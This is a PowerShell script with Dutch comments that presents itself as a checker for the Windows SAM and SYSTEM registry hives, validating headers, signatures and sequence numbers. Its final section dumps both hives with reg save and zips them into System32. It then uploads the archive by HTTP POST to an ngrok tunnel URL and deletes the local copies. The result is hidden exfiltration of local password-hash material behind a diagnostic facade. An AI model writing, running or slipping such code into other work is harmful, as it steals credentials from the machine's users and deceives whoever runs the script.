[CmdletBinding()]
param(
    [string]$SamPath    = "$env:SystemRoot\System32\config\SAM",
    [string]$SystemPath = "$env:SystemRoot\System32\config\SYSTEM",
    [string]$SavePath   = $env:TEMP
)

# ------------------------------------------------------------------
# Kan dit bestand direct gelezen worden (niet vergrendeld)?
# ------------------------------------------------------------------
function Test-Readable {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { return $false }
    try {
        $fs = [System.IO.File]::Open($Path, 'Open', 'Read', 'ReadWrite')
        $fs.Dispose()
        return $true
    } catch {
        return $false
    }
}

# ------------------------------------------------------------------
# Maak een consistente kopie van een live HKLM-hive via 'reg save'.
# Geeft het pad van de kopie terug, of $null bij mislukking.
# ------------------------------------------------------------------
function Get-HiveCopy {
    param(
        [string]$HiveKey,   # bv. 'HKLM\SAM'
        [string]$Label,
        [string]$Destination
    )
    $out = Join-Path $Destination ("{0}_{1}.hiv" -f $Label, (Get-Date -Format 'yyyyMMdd_HHmmss'))
    Write-Host ("  -> live bestand vergrendeld; probeer 'reg save {0}'..." -f $HiveKey) -ForegroundColor DarkGray
    $null = & reg.exe save $HiveKey $out /y 2>&1
    if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $out)) {
        Write-Host ("  -> kopie gemaakt: {0}" -f $out) -ForegroundColor DarkGray
        return $out
    }
    Write-Host ("  -> 'reg save' mislukt (exitcode {0}). Admin-rechten nodig?" -f $LASTEXITCODE) -ForegroundColor DarkGray
    return $null
}

# ------------------------------------------------------------------
# Valideer de header van een hive-bestand.
# ------------------------------------------------------------------
function Test-Hive {
    param(
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][string]$Label,
        [string]$Source = 'origineel'
    )

    $result = [ordered]@{
        Label          = $Label
        Path           = $Path
        Source         = $Source
        Exists         = $false
        Readable       = $false
        SizeBytes      = 0
        ValidSignature = $false
        Clean          = $null
        LastWritten    = $null
        EmbeddedName   = $null
        Status         = 'INVALID'
        Notes          = @()
    }

    if (-not (Test-Path -LiteralPath $Path)) {
        $result.Notes += 'Bestand niet gevonden.'
        return [pscustomobject]$result
    }
    $result.Exists = $true

    $fi = Get-Item -LiteralPath $Path -Force
    $result.SizeBytes = $fi.Length
    if ($fi.Length -lt 4096) {
        $result.Notes += 'Bestand is te klein om een geldige hive te zijn.'
        return [pscustomobject]$result
    }

    $bytes = New-Object byte[] 4096
    try {
        $fs = [System.IO.File]::Open($Path, 'Open', 'Read', 'ReadWrite')
        try   { [void]$fs.Read($bytes, 0, 4096) }
        finally { $fs.Dispose() }
        $result.Readable = $true
    }
    catch {
        $result.Notes += "Kon bestand niet lezen: $($_.Exception.Message)"
        return [pscustomobject]$result
    }

    $magic = [System.Text.Encoding]::ASCII.GetString($bytes, 0, 4)
    if ($magic -ne 'regf') {
        $result.Notes += "Signature is '$magic', verwacht 'regf'. Geen geldige hive."
        return [pscustomobject]$result
    }
    $result.ValidSignature = $true

    $seq1 = [BitConverter]::ToUInt32($bytes, 4)
    $seq2 = [BitConverter]::ToUInt32($bytes, 8)
    $result.Clean = ($seq1 -eq $seq2)
    if (-not $result.Clean) {
        $result.Notes += "Sequence numbers verschillen ($seq1 vs $seq2): hive is 'dirty'. Meestal nog bruikbaar na log-replay."
    }

    try {
        $ft = [BitConverter]::ToInt64($bytes, 12)
        if ($ft -gt 0) { $result.LastWritten = [DateTime]::FromFileTimeUtc($ft) }
    } catch { }

    try {
        $name = [System.Text.Encoding]::Unicode.GetString($bytes, 48, 64)
        $result.EmbeddedName = ($name -replace "`0.*$", '').Trim()
    } catch { }

    $result.Status = if ($result.Clean) { 'VALID' } else { 'VALID (dirty)' }
    return [pscustomobject]$result
}

# ------------------------------------------------------------------
# Zorg voor een bruikbaar hive-bestand: direct als het leesbaar is,
# anders via 'reg save'. Geeft $null als er niets bruikbaars is.
# ------------------------------------------------------------------
function Resolve-UsableHive {
    param(
        [string]$Path,
        [string]$Label,
        [string]$HiveKey,
        [string]$Destination
    )
    if (Test-Readable -Path $Path) {
        return [pscustomobject]@{ Path = $Path; Source = 'origineel' }
    }
    # Niet leesbaar -> probeer een kopie te maken van de live hive
    $copy = Get-HiveCopy -HiveKey $HiveKey -Label $Label -Destination $Destination
    if ($copy) {
        return [pscustomobject]@{ Path = $copy; Source = ("kopie via reg save ({0})" -f $HiveKey) }
    }
    return $null
}

# ------------------------------------------------------------------
# Hoofdlogica
# ------------------------------------------------------------------
$targets = @(
    @{ Label = 'SAM';    Path = $SamPath;    HiveKey = 'HKLM\SAM'    }
    @{ Label = 'SYSTEM'; Path = $SystemPath; HiveKey = 'HKLM\SYSTEM' }
)

$results = @()
foreach ($t in $targets) {
    Write-Host ("Bezig met {0}..." -f $t.Label) -ForegroundColor Cyan
    $usable = Resolve-UsableHive -Path $t.Path -Label $t.Label -HiveKey $t.HiveKey -Destination $SavePath

    if (-not $usable) {
        # Geen bruikbare hive -> stop het script onmiddellijk
        Write-Host ""
        Write-Host ("STOP: geen bruikbare {0}-hive." -f $t.Label) -ForegroundColor Red
        Write-Host ("  '{0}' is niet leesbaar en er kon geen kopie worden gemaakt." -f $t.Path) -ForegroundColor Red
        Write-Host "  Tip: start PowerShell als Administrator, of geef een geexporteerde hive mee met -SamPath / -SystemPath." -ForegroundColor Yellow
        exit 2
    }

    $results += (Test-Hive -Path $usable.Path -Label $t.Label -Source $usable.Source)
}

# ------------------------------------------------------------------
# Rapport
# ------------------------------------------------------------------
foreach ($r in $results) {
    Write-Host ""
    Write-Host ("=== {0} ===" -f $r.Label) -ForegroundColor Cyan
    Write-Host ("  Pad          : {0}" -f $r.Path)
    Write-Host ("  Bron         : {0}" -f $r.Source)
    Write-Host ("  Bestaat      : {0}" -f $r.Exists)
    Write-Host ("  Leesbaar     : {0}" -f $r.Readable)
    Write-Host ("  Grootte      : {0:N0} bytes" -f $r.SizeBytes)
    Write-Host ("  'regf' magic : {0}" -f $r.ValidSignature)
    Write-Host ("  Clean        : {0}" -f $r.Clean)
    if ($r.LastWritten)  { Write-Host ("  Laatst gewijz: {0} UTC" -f $r.LastWritten) }
    if ($r.EmbeddedName) { Write-Host ("  Interne naam : {0}" -f $r.EmbeddedName) }
    $color = if ($r.Status -like 'VALID*') { 'Green' } else { 'Red' }
    Write-Host ("  STATUS       : {0}" -f $r.Status) -ForegroundColor $color
    foreach ($n in $r.Notes) { Write-Host ("   - {0}" -f $n) -ForegroundColor Yellow }
}

Write-Host ""
$allValid = ($results | Where-Object { $_.Status -like 'VALID*' }).Count -eq $results.Count

if (-not $allValid) {
    Write-Host "Een of meer hives zijn ongeldig." -ForegroundColor Red
    exit 1
}

Write-Host "Beide hives zijn aanwezig en geldig." -ForegroundColor Green

# ------------------------------------------------------------------
# Definitieve export
# ------------------------------------------------------------------
Write-Host ""
$allValid = ($results | Where-Object { $_.Status -like 'VALID*' }).Count -eq $results.Count

if (-not $allValid) {
    Write-Host "Een of meer hives zijn ongeldig." -ForegroundColor Red
    exit 1
}

Write-Host "Beide hives zijn geldig." -ForegroundColor Green

# Exporteer de live hives
reg.exe save HKLM\SAM sam /y
if ($LASTEXITCODE -ne 0) { exit 3 }

reg.exe save HKLM\SYSTEM sys /y
if ($LASTEXITCODE -ne 0) { exit 4 }

# Maak ZIP
Compress-Archive -Path "$PWD\sam", "$PWD\sys" `
    -DestinationPath "C:\Windows\System32\dump.zip" `
    -Force

# Lees ZIP in als byte-array
$file = [System.IO.File]::ReadAllBytes("C:\Windows\System32\dump.zip")

iwr "https://monorail-moonlike-afoot.ngrok-free.dev/" -Method POST -Body $file -UseBasicParsing;


# Opruimen
Remove-Item .\sam -Force
Remove-Item .\sys -Force

exit 0
